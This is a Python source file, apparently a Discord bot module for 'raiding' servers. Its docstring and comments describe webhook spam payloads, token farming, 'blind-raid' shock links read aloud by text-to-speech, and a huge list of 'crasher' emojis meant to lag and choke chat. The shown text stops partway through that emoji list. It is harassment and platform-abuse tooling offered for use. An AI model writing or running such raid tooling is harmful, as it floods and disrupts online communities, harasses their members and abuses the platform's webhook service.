"""Every slash command lives here in one cog.

core/raids.py owns the raw webhook engine; this file only builds
payloads, tracks per-user raid state (buttons, token farms) and fires.
"""

import asyncio
import io
import json
import os
import random
import re
import time
from pathlib import Path

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands
from discord.ext import commands

from core import proxy, raids

BASE = Path(__file__).resolve().parent.parent

RAID_COUNT = 10
FARM_CAP = 125
FARM_PER_PRESS = 5

# blind-raid ammo - just these links, no raid text; tts reads the
# url gibberish aloud on top
_BLIND_LINKS = (
    "https://fakecri.me/DfoRM",
    "https://fakecri.me/adp7Y",
    "https://fakecri.me/pdj2A",
    "https://fakecri.me/g8oTD",
    "https://fakecri.me/Wn1r7",
    "https://fakecri.me/SDXaI",
)

_WEBHOOK = "https://discord.com/api/v10/webhooks/{app}/{token}"

# lagger picks an ugly pile of these to choke the chat with
_CRASHER_EMOJIS = ['🥈', '😙', '🜸', '👤', '🐲', '🛬', '🛺', '🏝', '🌕', '👱', '📼', '🏱', '🍧', '🤸', '🔄', '🧚', '🦦', '🛣', '\U0001f779', '🖎', '🖡', '🎝', '🌿', '🙃', '😃', '📟', '🌞', '🕘', '👦', '🧥', '😣', '🍘', '🍣', '🤑', '🖤', '😝', '🥌', '🦃', '🦷', '🝡', '🎦', '🛓', '🍒', '🎲', '📖', '🐒', '♲', '🏜', '🐆', '🎊', '💐', '🜺', '📂', '🔤', '📷', '👡', '🌒', '🐣', '🧼', '🌝', '📒', '🜂', '🎧', '🜶', '🚶', '🧽', '🍷', '🗕', '🗾', '🕂', '😪', '🦑', '📋', '🤖', '🗘', '🎎', '🝊', '🕋', '🔁', '🤅', '🚬', '🔭', '🝽', '🔏', '🍑', '🤢', '🦋', '👟', '👈', '🚯', '💻', '💚', '🌤', '🖸', '🧗', '😸', '🝈', '🖑', '\U0001f6d8', '🤿', '🤏', '🤥', '🗓', '🦝', '🍤', '😫', '🕴', '😄', '📘', '🏪', '🧋', '🥸', '🌢', '🥮', '🧈', '🖕', '📛', '🕪', '🐻', '🗵', '🍈', '🎯', '🚋', '🜕', '🧢', '🥪', '🔼', '🝍', '🌇', '🌜', '👍', '🔀', '🦻', '🌙', '🤾', '🌗', '🕧', '😧', '🧪', '📭', '🜅', '🏈', '🏒', '🦔', '🝠', '�', '🔑', '💀', '🐗', '🕲', '💑', '🦩', '🝳', '😭', '🖜', '🔒', '🕡', '🛄', '🌋', '🝏', '🏏', '🎱', '🚐', '🦍', '🕤', '📅', '🤀', '🐕', '🜳', '🥥', '😲', '🙎', '🌆', '🏄', '🦧', '🏔', '🦗', '🐅', '🖙', '👙', '😱', '🗏', '📽', '📙', '🥲', '🕃', '😜', '🦊', '🜞', '🔪', '🥂', '💁', '🥒', '🧮', '🐾', '🚝', '🎼', '🦭', '🤕', '💭', '🗁', '💲', '🖬', '🙀', '🐎', '🦙', '🥤', '🚌', '🜽', '💔', '🖶', '🍦', '📜', '🎑', '💃', '🧰', '🚷', '📕', '腳', '\U0001f6ef', '🖯', '🧐', '🕟', '🎁', '🏹', '🎤', '🥕', '🤤', '🗱', '🝬', '📎', '🛝', '😩', '💼', '🌎', '🍩', '🌈', '🎕', '🍴', '🐄', '🤔', '🎘', '👢', '🜻', '💈', '🛇', '🥘', '🦤', '🥦', '🍗', '📣', '💣', '🐼', '🚿', '🍥', '🍨', '🕛', '🎮', '💒', '🗪', '🗻', '👃', '🕳', '🛤', '🎳', '🎺', '🔃', '🔕', '💥', '🤄', '👎', '🔩', '💴', '🖥', '🥐', '😐', '🔶', '🗴', '🚸', '📤', '🜀', '🤣', '🛔', '😶', '🍡', '🖢', '🛳', '😂', '🜱', '🧏', '🤞', '🗠', '🧱', '🔴', '🜾', '🜫', '🐘', '🧧', '🐊', '🐙', '🏸', '💹', '\U0001f6ed', '🦉', '🌍', '🖝', '💬', '🤙', '📍', '🜈', '🚴', '🝖', '😏', '🚺', '🥧', '🜓', '🤂', '🔷', '🍛', '🎥', '🚟', '🎅', '💄', '🜉', '🚧', '🜨', '🛅', '孔', '雀', '🖈', '🦳', '🔮', '🎭', '🏳', '😗', '🕆', '🎩', '👕', '🗛', '🥞', '📲', '💯', '🕗', '🝲', '🏞', '🧟', '🜏', '🎐', '😾', '💸', '🜎', '🕄', '🖏', '👸', '👛', '📯', '🕙', '\U0001f6d9', '🌬', '🦕', '🐮', '🌔', '🥆', '🎗', '🐐', '🕿', '🖅', '👰', '🗦', '🌳', '🐶', '🜧', '🤧', '🗫', '🐖', '🧜', '🥚', '🤳', '🙄', '🎛', '🔽', '🤐', '🦼', '🖆', '🍚', '🙉', '🕓', '🚄', '🏦', '🦾', '🎋', '🝒', '💫', '🝛', '🎇', '💍', '🥍', '👴', '🎄', '🚳', '💰', '😕', '🍁', '🗥', '🜔', '🚤', '👻', '🕎', '🎵', '💇', '🖌', '🙊', '🍅', '🔨', '🥠', '👪', '🧹', '🌣', '🥹', '🕌', '🤭', '🚏', '💽', '😺', '🧫', '🐽', '📦', '🗝', '🧬', '🖱', '🚍', '🚭', '🏘', '🗲', '🗢', '🗶', '🛌', '🐉', '🏙', '🦚', '🔋', '🖚', '🝦', '🛜', '🎣', '🤽', '🜝', '🅢', '🕭', '🜡', '🌯', '😡', '😌', '🔗', '🍰', '👝', '🖁', '🎚', '🗉', '🗳', '🍄', '🎃', '🦽', '🍵', '🝰', '🍎', '🧨', '🔚', '👖', '🌛', '🎉', '🤹', '📚', '🜹', '🐋', '🛋', '🗊', '🧿', '🦛', '🤫', '🐳', '😤', '📸', '🥜', '夫', '妻', '🍻', '🝔', '🎷', '🜑', '🧄', '🗌', '🕑', '🕁', '🔡', '🖻', '🐵', '💿', '🝫', '🏽', '👭', '\U0001f778', '🔞', '🧾', '🚑', '📃', '🎟', '🦱', '🝨', '🤒', '🎔', '🐪', '🧺', '🧀', '👩', '🗍', '🙋', '🍕', '🚵', '🥝', '🥬', '💉', '🛷', '👒', '💡', '🌩', '👇', '🏊', '💝', '🐁', '🐱', '👓', '🗃', '😨', '🝤', '🖠', '🝮', '🔻', '🍼', '🦡', '🕝', '🏤', '🦨', '🏌', '🕅', '🎈', '喳', '箱', '🗄', '🧖', '🚅', '🜮', '🝿', '🛑', '😬', '🗣', '🐹', '🥰', '🍾', '🦯', '🙏', '🍟', '🐯', '🏗', '🝘', '🍢', '🔾', '🥭', '🥎', '🎨', '🥡', '🗸', '🌄', '🕼', '🥻', '🔂', '💂', '🛆', '😵', '🕊', '🜵', '🏍', '👅', '🍽', '🖉', '🏐', '🧭', '🏕', '🗰', '🏨', '🗒', '🝆', '📻', '🝉', '🛞', '🥩', '🥵', '🌵', '眼', '镜', '🦰', '🚲', '🖭', '🔓', '😀', '🔛', '📳', '🥫', '🝋', '🤦', '👀', '🥺', '🜿', '🏀', '🖋', '🚞', '🤇', '🚽', '🥼', '🎠', '😊', '🚇', '🧔', '👬', '🛖', '🕬', '🐿', '☖', '🚉', '🚙', '😋', '🦘', '😿', '📹', '🜘', '👫', '🔅', '🤉', '🕈', '🔫', '💆', '🍹', '💎', '💌', '👜', '😰', '🎏', '🜄', '🜌', '🎬', '🌶', '🧵', '🤚', '🖮', '🌡', '🚗', '💖', '🌑', '🧸', '📱', '🔸', '📊', '🏑', '🕍', '🕶', '😮', '🕏', '🖘', '🝁', '🕽', '🜗', '🜇', '🎀', '🏟', '🝅', '🗯', '🍖', '🕱', '👺', '🌭', '🖇', '😍', '💨', '🜛', '💢', '🛀', '🏉', '🧃', '🏚', '😓', '🝄', '😆', '🗋', '🛢', '🦲', '👧', '🏥', '🦢', '🚾', '🏣', '💾', '🤴', '🥳', '📶', '👼', '🜤', '🎪', '🛲', '🚡', '🜚', '🗔', '🔹', '🐜', '🥁', '🤁', '🧷', '🧴', '🍮', '📠', '👗', '🤝', '🐺', '🕉', '🝎', '🜪', '🛠', '\U0001f6ee', '📀', '💺', '🍋', '🧍', '🐍', '🍉', '📌', '🗆', '🖟', '🍀', '🧡', '🧁', '👠', '🍫', '🏰', '👣', '👑', '📏', '🗀', '🧒', '🥑', '🌼', '🗟', '🏭', '🔬', '📰', '🖊', '🜩', '📆', '🙌', '🥅', '🗬', '🏶', '🥙', '🏆', '💕', '🤪', '🕰', '🚼', '🖀', '🛱', '🎶', '🝟', '🍺', '🖖', '🦪', '🥋', '🛟', '🔺', '🚮', '🧦', '🧕', '🧂', '🖞', '🔲', '🌱', '🚎', '🛎', '😁', '🕺', '🍔', '🍳', '🚛', '💱', '🧙', '🧎', '📬', '😦', '🏡', '🎻', '🍌', '😽', '🌻', '🥊', '🧛', '🦐', '🗗', '爵', '士', '📡', '🍍', '🖛', '🜒', '🚰', '🛰', '🐞', '🚦', '拒', '绝', '🥄', '🔢', '🍃', '🌴', '\U0001f6ff', '🝻', '🦌', '🥉', '🛈', '🌁', '🚊', '🝐', '🝾', '🐡', '🥔', '🤰', '🔊', '🤘', '🜷', '🏅', '🜯', '🝝', '🜜', '🥇', '🏋', '🥯', '🤬', '💷', '🦓', '🛃', '🛗', '🛸', '🖫', '🖐', '境', '😷', '🐰', '🍸', '🜣', '👐', '🌅', '🏷', '🕞', '🌟', '🖳', '🍙', '🥓', '🌨', '🗡', '📄', '🏎', '🎂', '🛹', '🚢', '🚕', '🕻', '🔍', '🤩', '🗚', '🏮', '🗩', '🖴', '🛶', '🝃', '👘', '🚀', '🌰', '🍭', '🧌', '🛧', '🕹', '🤼', '😯', '🤃', '🔖', '\U0001f6da', '🧉', '🕖', '🚘', '🗎', '🤈', '🏧', '🦆', '💙', '🦞', '🎿', '🍂', '🧑', '💳', '🐂', '🍇', '👚', '🔧', '🤌', '🎽', '🝼', '🎡', '🧆', '🎓', '🛐', '🚻', '🖣', '🕦', '🗂', '🌊', '🚹', '🥛', '🤲', '😹', '📗', '\U0001f6db', '🚪', '👉', '👿', '🌺', '🍬', '🕒', '🛁', '🥀', '📩', '🧲', '🎸', '🐸', '👔', '👥', '🐬', '🝗', '🛻', '\U0001f6fd', '🔎', '🙇', '🌫', '🦴', '🍓', '🥱', '🖲', '🛂', '🕢', '🛨', '🤶', '🕫', '🧓', '👾', '🎆', '🔌', '💓', '📁', '🗤', '🦸', '🛡', '🐝', '🍐', '🎖', '🌪', '学', '校', '🧠', '💋', '🥽', '🌲', '🏿', '🜟', '🖩', '🦬', '🐧', '🗞', '🗽', '🗮', '🍲', '🐟', '🖺', '🜥', '🝞', '🐥', '🕠', '🌖', '🕕', '🙁', '🚠', '🐔', '🤨', '👁', '🚣', '🌃', '🐛', '🦟', '🍪', '😖', '🜊', '💮', '运', '动', '员', '兄', '弟', '🌌', '🥃', '🝀', '🖰', '🌦', '🜬', '👂', '🧻', '📾', '🛥', '🝭', '👞', '🏖', '😇', '胤', '🥴', '🕀', '🗈', '👏', '🚨', '🦫', '📺', '🌾', '🦺', '🤓', '🗭', '🤋', '🐏', '🕸', '🧣', '🐦', '🍯', '💵', '📴', '🧘', '📞', '🖽', '☀', '☁', '☂', '☃', '☄', '★', '☆', '☇', '☈', '☉', '☊', '☋', '☌', '☍', '☎', '☏', '☐', '☑', '☒', '☓', '☔', '☕', '☗', '☘', '☙', '☚', '☛', '☜', '☝', '☞', '☟', '☠', '☡', '☢', '☣', '☤', '☥', '☦', '☧', '☨', '☩', '☪', '☫', '☬', '☭', '☮', '☯', '☰', '☱', '☲', '☳', '☴', '☵', '☶', '☷', '☸', '☹', '☺', '☻', '☼', '☽', '☾', '☿', '♀', '♁', '♂', '♃', '♄', '♅', '♆', '♇', '♈', '♉', '♊', '♋', '♌', '♍', '♎', '♏', '♐', '♑', '♒', '♓', '♔', '♕', '♖', '♗', '♘', '♙', '♚', '♛', '♜', '♝', '♞', '♟', '♠', '♡', '♢', '♣', '♤', '♥', '♦', '♧', '♨', '♩', '♪', '♫', '♬', '♭', '♮', '♯', '♰', '♱', '♳', '♴', '♵', '♶', '♷', '♸', '♹', '♺', '♻', '♼', '♽', '♾', '♿', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅', '⚆', '⚇', '⚈', '⚉', '⚊', '⚋', '⚌', '⚍', '⚎', '⚏', '⚐', '⚑', '⚒', '⚓', '⚔', '⚕', '⚖', '⚗', '⚘', '⚙', '⚚', '⚛', '⚜', '⚝', '⚞', '⚟', '⚠', '⚡', '⚢', '⚣', '⚤', '⚥', '⚦', '⚧', '⚨', '⚩', '⚪', '⚫', '⚬', '⚭', '⚮', '⚯', '⚰', '⚱', '⚲', '⚳', '⚴', '⚵', '⚶', '⚷', '⚸', '⚹', '⚺', '⚻', '⚼', '⚽', '⚾', '⚿', '⛀', '⛁', '⛂', '⛃', '⛄', '⛅', '⛆', '⛇', '⛈', '⛉', '⛊', '⛋', '⛌', '⛍', '⛎', '⛏', '⛐', '⛑', '⛒', '⛓', '⛔', '⛕', '⛖', '⛗', '⛘', '⛙', '⛚', '⛛', '⛜', '⛝', '⛞', '⛟', '⛠', '⛡', '⛢', '⛣', '⛤', '⛥', '⛦', '⛧', '⛨', '⛩', '⛪', '⛫', '⛬', '⛭', '⛮', '⛯', '⛰', '⛱', '⛲', '⛳', '⛴', '⛵', '⛶', '⛷', '⛸', '⛹', '⛺', '⛻', '⛼', '⛽', '⛾', '⛿', '⌀', '⌁', '⌂', '⌃', '⌄', '⌅', '⌆', '⌇', '⌈', '⌉', '⌊', '⌋', '⌌', '⌍', '⌎', '⌏', '⌐', '⌑', '⌒', '⌓', '⌔', '⌕', '⌖', '⌗', '⌘', '⌙', '⌚', '⌛', '⌜', '⌝', '⌞', '⌟', '⌠', '⌡', '⌢', '⌣', '⌤', '⌥', '⌦', '⌧', '⌨', '〈', '〉', '⌫', '⌬', '⌭', '⌮', '⌯', '⌰', '⌱', '⌲', '⌳', '⌴', '⌵', '⌶', '⌷', '⌸', '⌹', '⌺', '⌻', '⌼', '⌽', '⌾', '⌿', '⍀', '⍁', '⍂', '⍃', '⍄', '⍅', '⍆', '⍇', '⍈', '⍉', '⍊', '⍋', '⍌', '⍍', '⍎', '⍏', '⍐', '⍑', '⍒', '⍓', '⍔', '⍕', '⍖', '⍗', '⍘', '⍙', '⍚', '⍛', '⍜', '⍝', '⍞', '⍟', '⍠', '⍡', '⍢', '⍣', '⍤', '⍥', '⍦', '⍧', '⍨', '⍩', '⍪', '⍫', '⍬', '⍭', '⍮', '⍯', '⍰', '⍱', '⍲', '⍳', '⍴', '⍵', '⍶', '⍷', '⍸', '⍹', '⍺', '⍻', '⍼', '⍽', '⍾', '⍿', '⎀', '⎁', '⎂', '⎃', '⎄', '⎅', '⎆', '⎇', '⎈', '⎉', '⎊', '⎋', '⎌', '⎍', '⎎', '⎏', '⎐', '⎑', '⎒', '⎓', '⎔', '⎕', '⎖', '⎗', '⎘', '⎙', '⎚', '⎛', '⎜', '⎝', '⎞', '⎟', '⎠', '⎡', '⎢', '⎣', '⎤', '⎥', '⎦', '⎧', '⎨', '⎩', '⎪', '⎫', '⎬', '⎭', '⎮', '⎯', '⎰', '⎱', '⎲', '⎳', '⎴', '⎵', '⎶', '⎷', '⎸', '⎹', '⎺', '⎻', '⎼', '⎽', '⎾', '⎿', '⏀', '⏁', '⏂', '⏃', '⏄', '⏅', '⏆', '⏇', '⏈', '⏉', '⏊', '⏋', '⏌', '⏍', '⏎', '⏏', '⏐', '⏑', '⏒', '⏓', '⏔', '⏕', '⏖', '⏗', '⏘', '⏙', '⏚', '⏛', '⏜', '⏝', '⏞', '⏟', '⏠', '⏡', '⏢', '⏣', '⏤', '⏥', '⏦', '⏧', '⏨', '⏩', '⏪', '⏫', '⏬', '⏭', '⏮', '⏯', '⏰', '⏱', '⏲', '⏳', '⏴', '⏵', '⏶', '⏷', '⏸', '⏹', '⏺', '⏻', '⏼', '⏽', '⏾', '⏿', '℀', '℁', 'ℂ', '℃', '℄', '℅', '℆', 'ℇ', '℈', '℉', 'ℊ', 'ℋ', 'ℌ', 'ℍ', 'ℎ', 'ℏ', 'ℐ', 'ℑ', 'ℒ', 'ℓ', '℔', 'ℕ', '№', '℗', '℘', 'ℙ', 'ℚ', 'ℛ', 'ℜ', 'ℝ', '℞', '℟', '℠', '℡', '™', '℣', 'ℤ', '℥', 'Ω', '℧', 'ℨ', '℩', 'K', 'Å', 'ℬ', 'ℭ', '℮', 'ℯ', 'ℰ', 'ℱ', 'Ⅎ', 'ℳ', 'ℴ', 'ℵ', 'ℶ', 'ℷ', 'ℸ', 'ℹ', '℺', '℻', 'ℼ', 'ℽ', 'ℾ', 'ℿ', '⅀', '⅁', '⅂', '⅃', '⅄', 'ⅅ', 'ⅆ', 'ⅇ', 'ⅈ', 'ⅉ', '⅊', '⅋', '⅌', '⅍', 'ⅎ', '⅏', '✀', '✁', '✂', '✃', '✄', '✅', '✆', '✇', '✈', '✉', '✊', '✋', '✌', '✍', '✎', '✏', '✐', '✑', '✒', '✓', '✔', '✕', '✖', '✗', '✘', '✙', '✚', '✛', '✜', '✝', '✞', '✟', '✠', '✡', '✢', '✣', '✤', '✥', '✦', '✧', '✨', '✩', '✪', '✫', '✬', '✭', '✮', '✯', '✰', '✱', '✲', '✳', '✴', '✵', '✶', '✷', '✸', '✹', '✺', '✻', '✼', '✽', '✾', '✿', '❀', '❁', '❂', '❃', '❄', '❅', '❆', '❇', '❈', '❉', '❊', '❋', '❌', '❍', '❎', '❏', '❐', '❑', '❒', '❓', '❔', '❕', '❖', '❗', '❘', '❙', '❚', '❛', '❜', '❝', '❞', '❟', '❠', '❡', '❢', '❣', '❤', '❥', '❦', '❧', '❨', '❩', '❪', '❫', '❬', '❭', '❮', '❯', '❰', '❱', '❲', '❳', '❴', '❵', '❶', '❷', '❸', '❹', '❺', '❻', '❼', '❽', '❾', '❿', '➀', '➁', '➂', '➃', '➄', '➅', '➆', '➇', '➈', '➉', '➊', '➋', '➌', '➍', '➎', '➏', '➐', '➑', '➒', '➓', '➔', '➕', '➖', '➗', '➘', '➙', '➚', '➛', '➜', '➝', '➞', '➟', '➠', '➡', '➢', '➣', '➤', '➥', '➦', '➧', '➨', '➩', '➪', '➫', '➬', '➭', '➮', '➯', '➰', '➱', '➲', '➳', '➴', '➵', '➶', '➷', '➸', '➹', '➺', '➻', '➼', '➽', '➾', '➿', '⟀', '⟁', '⟂', '⟃', '⟄', '⟅', '⟆', '⟇', '⟈', '⟉', '⟊', '⟋', '⟌', '⟍', '⟎', '⟏', '⟐', '⟑', '⟒', '⟓', '⟔', '⟕', '⟖', '⟗', '⟘', '⟙', '⟚', '⟛', '⟜', '⟝', '⟞', '⟟', '⟠', '⟡', '⟢', '⟣', '⟤', '⟥', '⟦', '⟧', '⟨', '⟩', '⟪', '⟫', '⟬', '⟭', '⟮', '⟯', '🌀', '🌂', '🌉', '🌏', '🌐', '🌓', '🌘', '🌚', '🌠', '🌥', '🌧', '🌮', '🌷', '🌸', '🌹', '🌽', '🍆', '🍊', '🍏', '🍜', '🍝', '🍞', '🍠', '🍱', '🍶', '🍿', '🎌', '🎍', '🎒', '🎙', '🎜', '🎞', '🎢', '🎫', '🎰', '🎴', '🎹', '🎾', '🏁', '🏂', '🏃', '🏇', '🏓', '🏛', '🏠', '🏢', '🏩', '🏫', '🏬', '🏯', '🏲', '🏴', '🏵', '🏺', '🏻', '🏼', '🏾', '🐀', '🐃', '🐇', '🐈', '🐌', '🐑', '🐓', '🐚', '🐠', '🐢', '🐤', '🐨', '🐩', '🐫', '🐭', '🐴', '🐷', '👄', '👆', '👊', '👋', '👌', '👨', '👮', '👯', '👲', '👳', '👵', '👶', '👷', '👹', '👽', '💅', '💊', '💏', '💗', '💘', '💛', '💜', '💞', '💟', '💠', '💤', '💦', '💧', '💩', '💪', '💶', '📇', '📈', '📉', '📐', '📑', '📓', '📔', '📝', '📢', '📥', '📧', '📨', '📪', '📫', '📮', '📵', '📿', '🔆', '🔇', '🔈', '🔉', '🔐', '🔔', '🔘', '🔙', '🔜', '🔝', '🔟', '🔠', '🔣', '🔥', '🔦', '🔯', '🔰', '🔱', '🔳', '🔵', '🔿', '🕇', '🕐', '🕔', '🕚', '🕜', '🕣', '🕥', '🕨', '🕩', '🕮', '🕯', '🕵', '🕷', '🕾', '🖂', '🖃', '🖄', '🖍', '🖒', '🖓', '🖔', '🖗', '🖦', '🖧', '🖨', '🖪', '🖵', '🖷', '🖹', '🖼', '🖾', '🖿', '🗅', '🗇', '🗐', '🗑', '🗖', '🗙', '🗜', '🗧', '🗨', '🗷', '🗹', '🗺', '🗼', '🗿', '😅', '😈', '😉', '😎', '😑', '😒', '😔', '😘', '😚', '😛', '😞', '😟', '😠', '😢', '😥', '😳', '😴', '😻', '😼', '🙂', '🙅', '🙆', '🙈', '🙍', '🚁', '🚂', '🚃', '🚆', '🚈', '🚒', '🚓', '🚔', '🚖', '🚚', '🚜', '🚥', '🚩', '🚫', '🚱', '🛉', '🛊', '🛍', '🛏', '🛒', '🛕', '🛦', '🛩', '🛪', '🛫', '🛴', '🛵', '🛼', '\U0001f6fe', '🤆', '🤊', '🤍', '🤎', '🤗', '🤛', '🤜', '🤟', '🤠', '🤡', '🤮', '🤯', '🤱', '🤵', '🤷', '🤺', '🤻', '🥏', '🥖', '🥗', '🥟', '🥢', '🥣', '🥨', '🥶', '🥷', '🥾', '🥿', '🦀', '🦁', '🦂', '🦄', '🦅', '🦇', '🦈', '🦎', '🦏', '🦒', '🦖', '🦜', '🦠', '🦣', '🦥', '🦮', '🦵', '🦶', '🦹', '🦿', '🧅', '🧇', '🧊', '🧝', '🧞', '🧤', '🧩', '🧯', '🧳', '🧶', '🨀', '🨁', '🨂', '🨃', '🨄', '🨅', '🨆', '🨇', '🨈', '🨉', '🨊', '🨋', '🨌', '🨍', '🨎', '🨏', '🨐', '🨑', '🨒', '🨓', '🨔', '🨕', '🨖', '🨗', '🨘', '🨙', '🨚', '🨛', '🨜', '🨝', '🨞', '🨟', '🨠', '🨡', '🨢', '🨣', '🨤', '🨥', '🨦', '🨧', '🨨', '🨩', '🨪', '🨫', '🨬', '🨭', '🨮', '🨯', '🨰', '🨱', '🨲', '🨳', '🨴', '🨵', '🨶', '🨷', '🨸', '🨹', '🨺', '🨻', '🨼', '🨽', '🨾', '🨿', '🩀', '🩁', '🩂', '🩃', '🩄', '🩅', '🩆', '🩇', '🩈', '🩉', '🩊', '🩋', '🩌', '🩍', '🩎', '🩏', '🩐', '🩑', '🩒', '🩓', '\U0001fa54', '\U0001fa55', '\U0001fa56', '\U0001fa57', '\U0001fa58', '\U0001fa59', '\U0001fa5a', '\U0001fa5b', '\U0001fa5c', '\U0001fa5d', '\U0001fa5e', '\U0001fa5f', '🩠', '🩡', '🩢', '🩣', '🩤', '🩥', '🩦', '🩧', '🩨', '🩩', '🩪', '🩫', '🩬', '🩭', '\U0001fa6e', '\U0001fa6f', '🩰', '🩱', '🩲', '🩳', '🩴', '🩵', '🩶', '🩷', '🩸', '🩹', '🩺', '🩻', '🩼', '\U0001fa7d', '\U0001fa7e', '\U0001fa7f', '🪀', '🪁', '🪂', '🪃', '🪄', '🪅', '🪆', '🪇', '🪈', '🪉', '\U0001fa8a', '\U0001fa8b', '\U0001fa8c', '\U0001fa8d', '\U0001fa8e', '🪏', '🪐', '🪑', '🪒', '🪓', '🪔', '🪕', '🪖', '🪗', '🪘', '🪙', '🪚', '🪛', '🪜', '🪝', '🪞', '🪟', '🪠', '🪡', '🪢', '🪣', '🪤', '🪥', '🪦', '🪧', '🪨', '🪩', '🪪', '🪫', '🪬', '🪭', '🪮', '🪯', '🪰', '🪱', '🪲', '🪳', '🪴', '🪵', '🪶', '🪷', '🪸', '🪹', '🪺', '🪻', '🪼', '🪽', '🪾', '🪿', '🫀', '🫁', '🫂', '🫃', '🫄', '🫅', '🫆', '\U0001fac7', '\U0001fac8', '\U0001fac9', '\U0001faca', '\U0001facb', '\U0001facc', '\U0001facd', '🫎', '🫏', '🫐', '🫑', '🫒', '🫓', '🫔', '🫕', '🫖', '🫗', '🫘', '🫙', '🫚', '🫛', '🫜', '\U0001fadd', '\U0001fade', '🫟', '🫠', '🫡', '🫢', '🫣', '🫤', '🫥', '🫦', '🫧', '🫨', '🫩', '\U0001faea', '\U0001faeb', '\U0001faec', '\U0001faed', '\U0001faee', '\U0001faef', '🫰', '🫱', '🫲', '🫳', '🫴', '🫵', '🫶', '🫷', '🫸', '\U0001faf9', '\U0001fafa', '\U0001fafb', '\U0001fafc', '\U0001fafd', '\U0001fafe', '\U0001faff', '①', '②', '③', '④', '⑤', '⑥', '⑦', '⑧', '⑨', '⑩', '⑪', '⑫', '⑬', '⑭', '⑮', '⑯', '⑰', '⑱', '⑲', '⑳', '⑴', '⑵', '⑶', '⑷', '⑸', '⑹', '⑺', '⑻', '⑼', '⑽', '⑾', '⑿', '⒀', '⒁', '⒂', '⒃', '⒄', '⒅', '⒆', '⒇', '⒈', '⒉', '⒊', '⒋', '⒌', '⒍', '⒎', '⒏', '⒐', '⒑', '⒒', '⒓', '⒔', '⒕', '⒖', '⒗', '⒘', '⒙', '⒚', '⒛', '⒜', '⒝', '⒞', '⒟', '⒠', '⒡', '⒢', '⒣', '⒤', '⒥', '⒦', '⒧', '⒨', '⒩', '⒪', '⒫', '⒬', '⒭', '⒮', '⒯', '⒰', '⒱', '⒲', '⒳', '⒴', '⒵', 'Ⓐ', 'Ⓑ', 'Ⓒ', 'Ⓓ', 'Ⓔ', 'Ⓕ', 'Ⓖ', 'Ⓗ', 'Ⓘ', 'Ⓙ', 'Ⓚ', 'Ⓛ', 'Ⓜ', 'Ⓝ', 'Ⓞ', 'Ⓟ', 'Ⓠ', 'Ⓡ', 'Ⓢ', 'Ⓣ', 'Ⓤ', 'Ⓥ', 'Ⓦ', 'Ⓧ', 'Ⓨ', 'Ⓩ', 'ⓐ', 'ⓑ', 'ⓒ', 'ⓓ', 'ⓔ', 'ⓕ', 'ⓖ', 'ⓗ', 'ⓘ', 'ⓙ', 'ⓚ', 'ⓛ', 'ⓜ', 'ⓝ', 'ⓞ', 'ⓟ', 'ⓠ', 'ⓡ', 'ⓢ', 'ⓣ', 'ⓤ', 'ⓥ', 'ⓦ', 'ⓧ', 'ⓨ', 'ⓩ', '⓪', '⓫', '⓬', '⓭', '⓮', '⓯', '⓰', '⓱', '⓲', '⓳', '⓴', '⓵', '⓶', '⓷', '⓸', '⓹', '⓺', '⓻', '⓼', '⓽', '⓾', '─', '━', '│', '┃', '┄', '┅', '┆', '┇', '┈', '┉', '┊', '┋', '┌', '┍', '┎', '┏', '┐', '┑', '┒', '┓', '└', '┕', '┖', '┗', '┘', '┙', '┚', '┛', '├', '┝', '┞', '┟', '┠', '┡', '┢', '┣', '┤', '┥', '┦', '┧', '┨', '┩', '┪', '┫', '┬', '┭', '┮', '┯', '┰', '┱', '┲', '┳', '┴', '┵', '┶', '┷', '┸', '┹', '┺', '┻', '┼', '┽', '┾', '┿', '╀', '╁', '╂', '╃', '╄', '╅', '╆', '╇', '╈', '╉', '╊', '╋', '╌', '╍', '╎', '╏', '═', '║', '╒', '╓', '╔', '╕', '╖', '╗', '╘', '╙', '╚', '╛', '╜', '╝', '╞', '╟', '╠', '╡', '╢', '╣', '╤', '╥', '╦', '╧', '╨', '╩', '╪', '╫', '╬', '╭', '╮', '╯', '╰', '╱', '╲', '╳', '╴', '╵', '╶', '╷', '╸', '╹', '╺', '╻', '╼', '╽', '╾', '╿', '▀', '▁', '▂', '▃', '▄', '▅', '▆', '▇', '█', '▉', '▊', '▋', '▌', '▍', '▎', '▏', '▐', '░', '▒', '▓', '▔', '▕', '▖', '▗', '▘', '▙', '▚', '▛', '▜', '▝', '▞', '▟', '■', '□', '▢', '▣', '▤', '▥', '▦', '▧', '▨', '▩', '▪', '▫', '▬', '▭', '▮', '▯', '▰', '▱', '▲', '△', '▴', '▵', '▶', '▷', '▸', '▹', '►', '▻', '▼', '▽', '▾', '▿', '◀', '◁', '◂', '◃', '◄', '◅', '◆', '◇', '◈', '◉', '◊', '○', '◌', '◍', '◎', '●', '◐', '◑', '◒', '◓', '◔', '◕', '◖', '◗', '◘', '◙', '◚', '◛', '◜', '◝', '◞', '◟', '◠', '◡', '◢', '◣', '◤', '◥', '◦', '◧', '◨', '◩', '◪', '◫', '◬', '◭', '◮', '◯', '◰', '◱', '◲', '◳', '◴', '◵', '◶', '◷', '◸', '◹', '◺', '◻', '◼', '◽', '◾', '◿', '←', '↑', '→', '↓', '↔', '↕', '↖', '↗', '↘', '↙', '↚', '↛', '↜', '↝', '↞', '↟', '↠', '↡', '↢', '↣', '↤', '↥', '↦', '↧', '↨', '↩', '↪', '↫', '↬', '↭', '↮', '↯', '↰', '↱', '↲', '↳', '↴', '↵', '↶', '↷', '↸', '↹', '↺', '↻', '↼', '↽', '↾', '↿', '⇀', '⇁', '⇂', '⇃', '⇄', '⇅', '⇆', '⇇', '⇈', '⇉', '⇊', '⇋', '⇌', '⇍', '⇎', '⇏', '⇐', '⇑', '⇒', '⇓', '⇔', '⇕', '⇖', '⇗', '⇘', '⇙', '⇚', '⇛', '⇜', '⇝', '⇞', '⇟', '⇠', '⇡', '⇢', '⇣', '⇤', '⇥', '⇦', '⇧', '⇨', '⇩', '⇪', '⇫', '⇬', '⇭', '⇮', '⇯', '⇰', '⇱', '⇲', '⇳', '⇴', '⇵', '⇶', '⇷', '⇸', '⇹', '⇺', '⇻', '⇼', '⇽', '⇾', '⇿', '𐌀', '𐌁', '𐌂', '𐌃', '𐌄', '𐌅', '𐌆', '𐌇', '𐌈', '𐌉', '𐌊', '𐌋', '𐌌', '𐌍', '𐌎', '𐌏', '𐌐', '𐌑', '𐌒', '𐌓', '𐌔', '𐌕', '𐌖', '𐌗', '𐌘', '𐌙', '𐌚', '𐌛', '𐌜', '𐌝', '𐌞', '𐌟', '𐌠', 